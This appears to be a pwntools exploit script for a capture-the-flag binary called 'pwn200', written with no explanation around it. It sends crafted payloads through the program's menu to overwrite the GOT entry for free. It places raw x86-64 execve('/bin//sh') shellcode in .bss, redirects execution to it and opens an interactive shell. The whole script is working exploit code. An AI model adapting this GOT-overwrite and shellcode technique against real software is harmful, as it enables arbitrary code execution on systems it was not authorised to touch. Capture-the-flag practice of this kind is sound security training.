from pwn import *

io = process('./pwn200')
e = ELF('./pwn200')

#gdb.attach(io, 'b* 0x400a72 ')

io.recvuntil(' u?\n')
io.sendline('1')
io.recvuntil('~~?\n')
io.sendline('1')
io.recvuntil('money~\n')

'''
.text:0000000000400A4D                 mov     edx, 40h        ; nbytes
.text:0000000000400A52                 mov     rsi, rax        ; buf
.text:0000000000400A55                 mov     edi, 0          ; fd
.text:0000000000400A5A                 mov     eax, 0
.text:0000000000400A5F                 call    _read
'''

payload = p64(0x400A29) + 0x30 * 'A' + p64(e.got['free'])

io.send(payload)

io.recvuntil('choice : ')
io.sendline('2')

io.recvuntil('money~\n')

x64sc = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

payload = x64sc.ljust(0x38, 'A') + p64(e.bss(0x20))

io.send(payload)
io.recvuntil('choice : ')
io.sendline('2')

io.recvuntil('money~\n')
payload = p64(e.bss(0x20)) + 0x30 * 'A' + p64(e.got['free'])
io.send(payload)
io.recvuntil('choice : ')
io.sendline('2')

io.interactive()